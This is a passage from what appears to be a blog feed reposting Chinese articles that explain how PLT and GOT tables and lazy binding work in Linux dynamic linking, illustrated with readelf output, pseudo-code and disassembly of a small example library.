<p>谈到这里，其实还有谜底是没有解开的，以printf函数为例：</p>
<ul>
<li>_dl_runtime_resolve是怎么知要查找printf函数的</li>
<li>_dl_runtime_resolve找到printf函数地址之后，它怎么知道回填到哪个GOT表项</li>
<li>到底_dl_runtime_resolve是什么时候被写到GOT表的</li>
</ul>
<p>前２个问题，只需要一个信息就可以了知道，这个信息就在藏在在函数对应的xxx@plt表中，以printf@plt为例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf@plt&gt;:</span><br><span class="line">   jmp *0x80496f8</span><br><span class="line">   push $0x00</span><br><span class="line">   jmp common@plt</span><br></pre></td></tr></table></figure>
<p>第二条指令就是秘密所在，每个xxx@plt的第二条指令push的操作数都是不一样的，它就相当于函数的id，动态链接器通过它就可以知道是要解析哪个函数了。</p>
<p>真有这么神吗？这不是神，是编译链接器和动态链接器故意安排的巧合罢了。</p>
<p>使用readelf -r test命令可以查看test可执行文件中的重定位信息，其中.rel.plt这一段就大有秘密：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ readelf -r test</span><br><span class="line">....</span><br><span class="line">Relocation section &#x27;.rel.plt&#x27; at offset 0x25c contains 3 entries:</span><br><span class="line"> Offset     Info     Type             Sym.Value  Sym. Name</span><br><span class="line"> 080496f8   00000107 R_386_JUMP_SLOT  00000000   puts</span><br><span class="line"> 080496fc   00000207 R_386_JUMP_SLOT  00000000   __gmon_start__</span><br><span class="line"> 08049700   00000407 R_386_JUMP_SLOT 000000000   __libc_start_main</span><br></pre></td></tr></table></figure>
<p>再看看各函数plt指令中的push操作数：<br>printf对应push 0x0<br><strong>gmon_start</strong>对应push 0x8<br>__libc_start_main对应push 0x10</p>
<p>这３个push操作数刚好对应３个函数在<strong>.rel.plt</strong>段的偏移量。在_dl_runtime_resolve函数内，根据这个offset和.rel.plt段的信息，就知道要解析的函数。再看看.rel.plt最左边的offset字段，它就是GOT表项的地址，也即_dl_runtime_resolve做完符号解析之后，重定位回写的空间。</p>
<p><strong>第三个问题：到底_dl_runtime_resolve是什么时候被写到GOT表的。</strong><br>答案很简单，可执行文件在Linux内核通过exeve装载完成之后，不直接执行，而是先跳到动态链接器（ld-linux-XXX）执行。在ld-linux-XXX里将_dl_runtime_resolve地址写到GOT表项内。</p>
<p>事实上，不单单是预先写_dl_runtime_resolve地址到GOT表项中，在i386架构下，除了每个函数占用一个GOT表项外，GOT表项还保留了３个公共表项，也即got的前３项，分别保存：</p>
<p><strong>got[0]: 本ELF动态段(.dynamic段）的装载地址</strong></p>
<p><strong>got[1]：本ELF的link_map数据结构描述符地址</strong></p>
<p><strong>got[2]：_dl_runtime_resolve函数的地址</strong></p>
<p>动态链接器在加载完ELF之后，都会将这３地址写到GOT表的前３项。<br>其实上述公共的plt指令里面，还有一个操作数是没有分析的，其实它就是got[1]（本ELF的link_map)地址，因为只有link_map结构，结合.rel.plt段的偏移量，才能真正找到该elf的.rel.plt表项。</p>
<p>有兴趣的读者可以使用gdb，在执行到main函数时，将GOT表的这３项数据看一下，验证一下。</p>
<p>好了，谈到这里是否对PLT和GOT机制有个更清晰认识了呢？最后一篇会使用图文结构将整个PLT/GOT机制串起来。</p>
]]></content>
      <categories>
        <category>转载</category>
        <category>ctf</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>转载</tag>
        <tag>glibc</tag>
        <tag>plt</tag>
        <tag>got</tag>
        <tag>动态链接</tag>
        <tag>重定位</tag>
      </tags>
  </entry>
  <entry>
    <title>转载0004 plt表和got表4</title>
    <url>/2024/11/13/transship/%E8%BD%AC%E8%BD%BD0004-plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A84/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是转载于CSDN的文章，仅用作存储，遵循 CC 4.0 BY-SA版权协议。</p>
<p><a href="https://linyt.blog.csdn.net/article/details/51893258">聊聊Linux动态链接中的PLT和GOT（4）—— 穿针引线</a></p>
<p>原作者：<a href="https://linyt.blog.csdn.net/">海枫</a></p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="编译时的PLT和GOT关系图"><a href="#编译时的PLT和GOT关系图" class="headerlink" title="编译时的PLT和GOT关系图"></a>编译时的PLT和GOT关系图</h2><p>前几篇文章一直在讨论PLT和GOT的结构细节，编译完成之后，PLT和GOT的对应关系是怎么样的呢，下面是编译完成之后，PLT和GOT关系图。</p>
<p><img src="/image/post/transship/0004/1.jpg" alt=""></p>
<p>图中重点标注了从调用printf函数语句的汇编指令call puts@plt跳转过程，图中使用编号来表标跳转顺序。</p>
<p><strong>PLT</strong>表结构有以下特点：</p>
<ol>
<li>PLT表中的第一项为公共表项，剩下的是每个动态库函数为一项（当然每项是由多条指令组成的，jmp *0xXXXXXXXX这条指令是所有plt的开始指令）</li>
<li>每项PLT都从对应的GOT表项中读取目标函数地址</li>
</ol>
<p><strong>GOT</strong>表结构有以下特点：</p>
<ol>
<li>GOT表中前3个为特殊项，分别用于保存 .dynamic段地址、本镜像的link_map数据结构地址和_dl_runtime_resolve函数地址；但在编译时，无法获取知道link_map地址和_dl_runtime_resolve函数地址，所以编译时填零地址，进程启动时由动态链接器进行填充</li>
<li>3个特殊项后面依次是每个动态库函数的GOT表项</li>
</ol>
<p>如果将PLT和GOT抽象起来描述，可以写成以下的伪代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">plt[<span class="number">0</span>]:</span><br><span class="line">  pushl got[<span class="number">1</span>]</span><br><span class="line">  jmp  *got[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">plt[n]:                <span class="comment">// n &gt;= 1</span></span><br><span class="line">  jmp *got[n+<span class="number">2</span>]        <span class="comment">// GOT前3项为公共项，第3项开始才是函数项，plt[1]对应的GOT[3]，依次类推</span></span><br><span class="line">  push (n<span class="number">-1</span>)*<span class="number">8</span></span><br><span class="line">  jmp plt[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">got[<span class="number">0</span>]  = address of .dynamic section</span><br><span class="line">got[<span class="number">1</span>]  = address of link_map object<span class="comment">//( 编译时填充0）</span></span><br><span class="line">got[<span class="number">2</span>]  = address of _dl_runtime_resolve function <span class="comment">//(编译时填充为0)</span></span><br><span class="line">got[n+<span class="number">2</span>]  = plt[n] + <span class="number">6</span> <span class="comment">//(即plt[n]代码片段的第二条指令）</span></span><br></pre></td></tr></table></figure>
<h2 id="进程启动后的GOT表"><a href="#进程启动后的GOT表" class="headerlink" title="进程启动后的GOT表"></a>进程启动后的GOT表</h2><p>PLT属于代码段，在进程加载和运行过程都不会发生改变，PLT指向GOT表的关系在编译时已完全确定，唯一能发生变化的是GOT表。</p>
<p>Linux加载进程时，通过execve系统调用进入内核态，将镜像加载到内存，然后返回用户态执行。返回用户态时，它的控制权并不是交给可执行文件，而是给动态链接器去完成一些基础的功能，比如上述的GOT[1]，GOT[2]的填写就是这个阶段完成的。下图是动态链接器填完GOT[1]，GOT[2]后的GOT图：</p>
<p><img src="/image/post/transship/0004/2.jpg" alt=""></p>
<p>估计大家比较好奇的是，动态链接器怎么知道GOT的首地址？这个秘密就藏在ELF的.dynamic段里面，详见下面<code>readelf -d test</code>输出结果中的<strong>PLTGOT</strong>项：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ivan@ivan:~/test/test$ readelf -d test</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0x600 contains 24 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line"> 0x0000000c (INIT)                       0x8048274</span><br><span class="line"> 0x0000000d (FINI)                       0x8048488</span><br><span class="line"> 0x00000019 (INIT_ARRAY)                 0x80495f4</span><br><span class="line"> 0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x0000001a (FINI_ARRAY)                 0x80495f8</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x00000004 (HASH)                       0x8048168</span><br><span class="line"> 0x00000005 (STRTAB)                     0x80481e0</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x8048190</span><br><span class="line"> 0x0000000a (STRSZ)                      74 (bytes)</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000015 (DEBUG)                      0x0</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x80496ec</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   24 (bytes)</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000017 (JMPREL)                     0x804825c</span><br><span class="line"> 0x00000011 (REL)                        0x8048254</span><br><span class="line"> 0x00000012 (RELSZ)                      8 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0x8048234</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0x804822a</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure>
<p>其实.dynamic段还藏着很多其它信息，都是跟动态运行相关的信息，有兴趣的读者可以自行分析，这里不详细介绍。</p>
<h2 id="动态重定位执行过程"><a href="#动态重定位执行过程" class="headerlink" title="动态重定位执行过程"></a>动态重定位执行过程</h2><p>Linux 动态链接器提供动态重位功能，所有外部函数只有调用时才做重定位，实现延迟绑定功能。下面是以调用puts函数为例画出了整个动态重定位的执行过程：</p>
<p><img src="/image/post/transship/0004/3.jpg" alt=""></p>
<p>在 _dl_runtime_resolve函数内完成puts符号查找后，将该函数地址地址重定位到对应的GOT表项，并调用。</p>
<h2 id="重定位之后的调用"><a href="#重定位之后的调用" class="headerlink" title="重定位之后的调用"></a>重定位之后的调用</h2><p>GOT表项已完成重定位的情况下，PLT利用GOT表直接调用到真实的动态库函数，下面puts函数的调用过程：</p>
<p><img src="/image/post/transship/0004/4.jpg" alt=""></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于PLT和GOT的原理，一共分享了以下知识点：</p>
<ol>
<li>为什么会有PLT和GOT表，它完成什么功能</li>
<li>Linux如何通过 PLT和GOT表配合，完成延迟重定位功能</li>
<li>PLT和GOT的结构是怎么样的，并且介绍每种场景下PLT的执行过程</li>
</ol>
<p>关于PLT/GOT的基本知识写到这样就有清晰的认识了，但是Linux还有其它场景也会使用PLT/GOT，以后遇到时再展开讨论。</p>
<p>最后，本系列文章所有二进制分析，都是基于以下代码编译出来的可执行文件（32位）进行分析。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_banner</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to World of PLT and GOT\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    print_banner();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>具体编译方法参考（转载1）。</p>
]]></content>
      <categories>
        <category>转载</category>
        <category>ctf</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>转载</tag>
        <tag>glibc</tag>
        <tag>plt</tag>
        <tag>got</tag>
        <tag>动态链接</tag>
        <tag>重定位</tag>
      </tags>
  </entry>
  <entry>
    <title>转载0005 plt表和got表5</title>
    <url>/2024/11/13/transship/%E8%BD%AC%E8%BD%BD0005-plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A85/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文转载自知乎，仅用作存储用。</p>
<p><a href="https://zhuanlan.zhihu.com/p/558522498">再看动态链接中的PLT和GOT - 读懂原理与细节</a></p>
<p>作者主页：<a href="https://www.zhihu.com/people/li-jian-hong-13-63">红色的红</a></p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p><img src="/image/post/transship/0005/1.jpg" alt="原背景"></p>
<center>原背景</center>

<ul>
<li>魔鬼都藏在细节中, 不深入细节我总以为我已经懂了. 此文就是用于解决所有细节的落脚。</li>
</ul>
<h2 id="待解决的疑问："><a href="#待解决的疑问：" class="headerlink" title="待解决的疑问："></a>待解决的疑问：</h2><ul>
<li>动态库中的PLT表与主程序中的PLT表是否为同一份。</li>
<li>动态库中的GOT.PLT表与主程序中的GOT.PLT表是否为同一份。</li>
<li>PLT表是代码还是数据。</li>
<li>动态库内部函数之间的调用为何不直接使用相对地址调用。</li>
</ul>
<hr>
<ul>
<li>由于<code>.plt</code>段的作用(用于延时加载)不是 这篇文章的重点. 我们都知道其延时加载的原理和基本方法.这里就不额外展开说明这一点.可以参考内容[1][2].</li>
</ul>
<h2 id="代码准备"><a href="#代码准备" class="headerlink" title="代码准备"></a>代码准备</h2><ul>
<li>简单对代码作一个说明:</li>
<li><code>add.so</code> 会被编译为一个动态库. 里面包含两个函数:<ul>
<li>addtwo 完成两个数的加法.</li>
<li>addthree 完成</li>
</ul>
</li>
</ul>
<h3 id="main-c"><a href="#main-c" class="headerlink" title="main.c"></a><code>main.c</code></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个外部导入的函数</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">addtwo</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">addthree</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y,<span class="type">int</span> z)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> sum = addtwo(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;1+2=%d\n&quot;</span>,sum);</span><br><span class="line">  sum = addthree(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;1+2+3=%d\n&quot;</span>,sum);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="动态库-add-so"><a href="#动态库-add-so" class="headerlink" title="动态库: add.so"></a>动态库: <code>add.so</code></h3><p>源文件: <code>add.c</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">addtwo</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">  sum = x + y;</span><br><span class="line">  <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">addthree</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y,<span class="type">int</span> z)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">  sum = addtwo(x,y)+z;</span><br><span class="line">  <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="makefile"><a href="#makefile" class="headerlink" title="makefile"></a>makefile</h3><p>一份”能用”的makefile,主要是用于记录编译参数. 方便重复输入：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">so:</span><br><span class="line">	gcc -m32 -g -Wl,-soname,add.so -shared -fPIC -o add.so add.c</span><br><span class="line">main:</span><br><span class="line">	gcc -m32 -g -Wl,-rpath,./ -o main.out main.c add.so</span><br></pre></td></tr></table></figure>
<h2 id="编译结果分析"><a href="#编译结果分析" class="headerlink" title="编译结果分析"></a>编译结果分析</h2><ul>
<li>我们着重对相关的<code>.dynamic</code>和相关的符号(<code>symbol</code>)和重定位表<code>rel.dyn</code>等进行详细分析。</li>
</ul>
<h3 id="分析-add-so"><a href="#分析-add-so" class="headerlink" title="分析: add.so"></a>分析: <code>add.so</code></h3><ul>
<li>命令: <code>objdump -d add.so</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> .add.so:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .init:</span><br><span class="line"></span><br><span class="line">000002dc &lt;_init&gt;:</span><br><span class="line"> 2dc:	55                   	push   %ebp</span><br><span class="line"> 2dd:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 2df:	53                   	push   %ebx</span><br><span class="line"> 2e0:	83 ec 04             	sub    $0x4,%esp</span><br><span class="line"> 2e3:	e8 00 00 00 00       	call   2e8 &lt;_init+0xc&gt;</span><br><span class="line"> 2e8:	5b                   	pop    %ebx</span><br><span class="line"> 2e9:	81 c3 cc 12 00 00    	add    $0x12cc,%ebx</span><br><span class="line"> 2ef:	8b 93 f4 ff ff     ff    	mov    -0xc(%ebx),%edx</span><br><span class="line"> 2f5:	85 d2                	test   %edx,%edx</span><br><span class="line"> 2f7:	74 05                	je     2fe &lt;_init+0x22&gt;</span><br><span class="line"> 2f9:	e8 1e 00 00 00       	call   31c &lt;__gmon_start__@plt&gt;</span><br><span class="line"> 2fe:	e8 cd 00 00 00       	call   3d0 &lt;frame_dummy&gt;</span><br><span class="line"> 303:	e8 68 01 00 00       	call   470 &lt;__do_global_ctors_aux&gt;</span><br><span class="line"> 308:	58                   	pop    %eax</span><br><span class="line"> 309:	5b                   	pop    %ebx</span><br><span class="line"> 30a:	c9                   	leave</span><br><span class="line"> 30b:	c3                   	ret</span><br><span class="line"></span><br><span class="line">; =====================================================</span><br><span class="line">; add.so 动态链接库的 .plt 段                        .</span><br><span class="line">; =====================================================</span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">0000030c &lt;__gmon_start__@plt-0x10&gt;:</span><br><span class="line"> 30c:	ff b3 04 00 00 00    	pushl  0x4(%ebx)</span><br><span class="line"> 312:	ff a3 08 00 00 00    	jmp    *0x8(%ebx)</span><br><span class="line"> 318:	00 00                	add    %al,(%eax)</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">0000031c &lt;__gmon_start__@plt&gt;:</span><br><span class="line"> 31c:	ff a3 0c 00 00 00    	jmp    *0xc(%ebx)</span><br><span class="line"> 322:	68 00 00 00 00       	push   $0x0</span><br><span class="line"> 327:	e9 e0 ff ff ff       	jmp    30c &lt;_init+0x30&gt;</span><br><span class="line"></span><br><span class="line">0000032c &lt;addtwo@plt&gt;:</span><br><span class="line"> 32c:	ff a3 10 00 00 00    	jmp    *0x10(%ebx)</span><br><span class="line"> 332:	68 08 00 00 00       	push   $0x8</span><br><span class="line"> 337:	e9 d0 ff ff ff       	jmp    30c &lt;_init+0x30&gt;</span><br><span class="line"></span><br><span class="line">0000033c &lt;__cxa_finalize@plt&gt;:</span><br><span class="line"> 33c:	ff a3 14 00 00 00    	jmp    *0x14(%ebx)</span><br><span class="line"> 342:	68 10 00 00 00       	push   $0x10</span><br><span class="line"> 347:	e9 c0 ff ff ff       	jmp    30c &lt;_init+0x30&gt;</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000350 &lt;__do_global_dtors_aux&gt;:</span><br><span class="line"> 350:	55                   	push   %ebp</span><br><span class="line"> 351:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 353:	56                   	push   %esi</span><br><span class="line"> 354:	53                   	push   %ebx</span><br><span class="line"> 355:	e8 ad 00 00 00       	call   407 &lt;__i686.get_pc_thunk.bx&gt;</span><br><span class="line"> 35a:	81 c3 5a 12 00 00    	add    $0x125a,%ebx</span><br><span class="line"> 360:	83 ec 10             	sub    $0x10,%esp</span><br><span class="line"> 363:	80 bb 18 00 00 00 00 	cmpb   $0x0,0x18(%ebx)</span><br><span class="line"> 36a:	75 5d                	jne    3c9 &lt;__do_global_dtors_aux+0x79&gt;</span><br><span class="line"> 36c:	8b 83 fc ff ff ff    	mov    -0x4(%ebx),%eax</span><br><span class="line"> 372:	85 c0                	test   %eax,%eax</span><br><span class="line"> 374:	74 0e                	je     384 &lt;__do_global_dtors_aux+0x34&gt;</span><br><span class="line"> 376:	8d 83 28 ff ff ff    	lea    -0xd8(%ebx),%eax</span><br><span class="line"> 37c:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 37f:	e8 b8 ff ff ff       	call   33c &lt;__cxa_finalize@plt&gt;</span><br><span class="line"> 384:	8b 83 1c 00 00 00    	mov    0x1c(%ebx),%eax</span><br><span class="line"> 38a:	8d b3 20 ff ff ff    	lea    -0xe0(%ebx),%esi</span><br><span class="line"> 390:	8d 93 1c ff ff ff    	lea    -0xe4(%ebx),%edx</span><br><span class="line"> 396:	29 d6                	sub    %edx,%esi</span><br><span class="line"> 398:	c1 fe 02             	sar    $0x2,%esi</span><br><span class="line"> 39b:	83 ee 01             	sub    $0x1,%esi</span><br><span class="line"> 39e:	39 f0                	cmp    %esi,%eax</span><br><span class="line"> 3a0:	73 20                	jae    3c2 &lt;__do_global_dtors_aux+0x72&gt;</span><br><span class="line"> 3a2:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi</span><br><span class="line"> 3a8:	83 c0 01             	add    $0x1,%eax</span><br><span class="line"> 3ab:	89 83 1c 00 00 00    	mov    %eax,0x1c(%ebx)</span><br><span class="line"> 3b1:	ff 94 83 1c ff ff ff 	call   *-0xe4(%ebx,%eax,4)</span><br><span class="line"> 3b8:	8b 83 1c 00 00 00    	mov    0x1c(%ebx),%eax</span><br><span class="line"> 3be:	39 f0                	cmp    %esi,%eax</span><br><span class="line"> 3c0:	72 e6                	jb     3a8 &lt;__do_global_dtors_aux+0x58&gt;</span><br><span class="line"> 3c2:	c6 83 18 00 00 00 01 	movb   $0x1,0x18(%ebx)</span><br><span class="line"> 3c9:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 3cc:	5b                   	pop    %ebx</span><br><span class="line"> 3cd:	5e                   	pop    %esi</span><br><span class="line"> 3ce:	5d                   	pop    %ebp</span><br><span class="line"> 3cf:	c3                   	ret</span><br><span class="line"></span><br><span class="line">000003d0 &lt;frame_dummy&gt;:</span><br><span class="line"> 3d0:	55                   	push   %ebp</span><br><span class="line"> 3d1:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 3d3:	53                   	push   %ebx</span><br><span class="line"> 3d4:	e8 2e 00 00 00       	call   407 &lt;__i686.get_pc_thunk.bx&gt;</span><br><span class="line"> 3d9:	81 c3 db 11 00 00    	add    $0x11db,%ebx</span><br><span class="line"> 3df:	83 ec 14             	sub    $0x14,%esp</span><br><span class="line"> 3e2:	8b 93 24 ff ff ff    	mov    -0xdc(%ebx),%edx</span><br><span class="line"> 3e8:	85 d2                	test   %edx,%edx</span><br><span class="line"> 3ea:	74 15                	je     401 &lt;frame_dummy+0x31&gt;</span><br><span class="line"> 3ec:	8b 83 f8 ff ff ff    	mov    -0x8(%ebx),%eax</span><br><span class="line"> 3f2:	85 c0                	test   %eax,%eax</span><br><span class="line"> 3f4:	74 0b                	je     401 &lt;frame_dummy+0x31&gt;</span><br><span class="line"> 3f6:	8d 93 24 ff ff ff    	lea    -0xdc(%ebx),%edx</span><br><span class="line"> 3fc:	89 14 24             	mov    %edx,(%esp)</span><br><span class="line"> 3ff:	ff d0                	call   *%eax</span><br><span class="line"> 401:	83 c4 14             	add    $0x14,%esp</span><br><span class="line"> 404:	5b                   	pop    %ebx</span><br><span class="line"> 405:	5d                   	pop    %ebp</span><br><span class="line"> 406:	c3                   	ret</span><br><span class="line"></span><br><span class="line">00000407 &lt;__i686.get_pc_thunk.bx&gt;:</span><br><span class="line"> 407:	8b 1c 24             	mov    (%esp),%ebx</span><br><span class="line"> 40a:	c3                   	ret</span><br><span class="line"> 40b:	90                   	nop</span><br><span class="line"></span><br><span class="line">0000040c &lt;addtwo&gt;:</span><br><span class="line"> 40c:	55                   	push   %ebp</span><br><span class="line"> 40d:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 40f:	83 ec 10             	sub    $0x10,%esp</span><br><span class="line"> 412:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)</span><br><span class="line"> 419:	8b 45 0c             	mov    0xc(%ebp),%eax</span><br><span class="line"> 41c:	8b 55 08             	mov    0x8(%ebp),%edx</span><br><span class="line"> 41f:	8d 04 02             	lea    (%edx,%eax,1),%eax</span><br><span class="line"> 422:	89 45 fc             	mov    %eax,-0x4(%ebp)</span><br><span class="line"> 425:	8b 45 fc             	mov    -0x4(%ebp),%eax</span><br><span class="line"> 428:	c9                   	leave</span><br><span class="line"> 429:	c3                   	ret</span><br><span class="line"></span><br><span class="line">0000042a &lt;addthree&gt;:</span><br><span class="line"> 42a:	55                   	push   %ebp</span><br><span class="line"> 42b:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 42d:	53                   	push   %ebx</span><br><span class="line"> 42e:	83 ec 24             	sub    $0x24,%esp</span><br><span class="line"> 431:	e8 d1 ff ff ff       	call   407 &lt;__i686.get_pc_thunk.bx&gt;</span><br><span class="line"> 436:	81 c3 7e 11 00 00    	add    $0x117e,%ebx</span><br><span class="line"> 43c:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)</span><br><span class="line"> 443:	8b 45 0c             	mov    0xc(%ebp),%eax</span><br><span class="line"> 446:	89 44 24 04          	mov    %eax,0x4(%esp)</span><br><span class="line"> 44a:	8b 45 08             	mov    0x8(%ebp),%eax</span><br><span class="line"> 44d:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 450:	e8 d7 fe ff ff       	call   32c &lt;addtwo@plt&gt;</span><br><span class="line"> 455:	03 45 10             	add    0x10(%ebp),%eax</span><br><span class="line"> 458:	89 45 f4             	mov    %eax,-0xc(%ebp)</span><br><span class="line"> 45b:	8b 45 f4             	mov    -0xc(%ebp),%eax</span><br><span class="line"> 45e:	83 c4 24             	add    $0x24,%esp</span><br><span class="line"> 461:	5b                   	pop    %ebx</span><br><span class="line"> 462:	5d                   	pop    %ebp</span><br><span class="line"> 463:	c3                   	ret</span><br><span class="line"> 464:	90                   	nop</span><br><span class="line"> 465:	90                   	nop</span><br><span class="line"> 466:	90                   	nop</span><br><span class="line"> 467:	90                   	nop</span><br><span class="line"> 468:	90                   	nop</span><br><span class="line"> 469:	90                   	nop</span><br><span class="line"> 46a:	90                   	nop</span><br><span class="line"> 46b:	90                   	nop</span><br><span class="line"> 46c:	90                   	nop</span><br><span class="line"> 46d:	90                   	nop</span><br><span class="line"> 46e:	90                   	nop</span><br><span class="line"> 46f:	90                   	nop</span><br><span class="line"></span><br><span class="line">00000470 &lt;__do_global_ctors_aux&gt;:</span><br><span class="line"> 470:	55                   	push   %ebp</span><br><span class="line"> 471:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 473:	56                   	push   %esi</span><br><span class="line"> 474:	53                   	push   %ebx</span><br><span class="line"> 475:	e8 8d ff ff ff       	call   407 &lt;__i686.get_pc_thunk.bx&gt;</span><br><span class="line"> 47a:	81 c3 3a 11 00 00    	add    $0x113a,%ebx</span><br><span class="line"> 480:	8b 83 14 ff ff ff    	mov    -0xec(%ebx),%eax</span><br><span class="line"> 486:	83 f8 ff             	cmp    $0xffffffff,%eax</span><br><span class="line"> 489:	74 19                	je     4a4 &lt;__do_global_ctors_aux+0x34&gt;</span><br><span class="line"> 48b:	8d b3 14 ff ff ff    	lea    -0xec(%ebx),%esi</span><br><span class="line"> 491:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi</span><br><span class="line"> 498:	83 ee 04             	sub    $0x4,%esi</span><br><span class="line"> 49b:	ff d0                	call   *%eax</span><br><span class="line"> 49d:	8b 06                	mov    (%esi),%eax</span><br><span class="line"> 49f:	83 f8 ff             	cmp    $0xffffffff,%eax</span><br><span class="line"> 4a2:	75 f4                	jne    498 &lt;__do_global_ctors_aux+0x28&gt;</span><br><span class="line"> 4a4:	5b                   	pop    %ebx</span><br><span class="line"> 4a5:	5e                   	pop    %esi</span><br><span class="line"> 4a6:	5d                   	pop    %ebp</span><br><span class="line"> 4a7:	c3                   	ret</span><br><span class="line"></span><br><span class="line">Disassembly of section .fini:</span><br><span class="line"></span><br><span class="line">000004a8 &lt;_fini&gt;:</span><br><span class="line"> 4a8:	55                   	push   %ebp</span><br><span class="line"> 4a9:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 4ab:	53                   	push   %ebx</span><br><span class="line"> 4ac:	83 ec 04             	sub    $0x4,%esp</span><br><span class="line"> 4af:	e8 00 00 00 00       	call   4b4 &lt;_fini+0xc&gt;</span><br><span class="line"> 4b4:	5b                   	pop    %ebx</span><br><span class="line"> 4b5:	81 c3 00 11 00 00    	add    $0x1100,%ebx</span><br><span class="line"> 4bb:	e8 90 fe ff ff       	call   350 &lt;__do_global_dtors_aux&gt;</span><br><span class="line"> 4c0:	59                   	pop    %ecx</span><br><span class="line"> 4c1:	5b                   	pop    %ebx</span><br><span class="line"> 4c2:	c9                   	leave</span><br><span class="line"> 4c3:	c3                   	ret</span><br></pre></td></tr></table></figure>
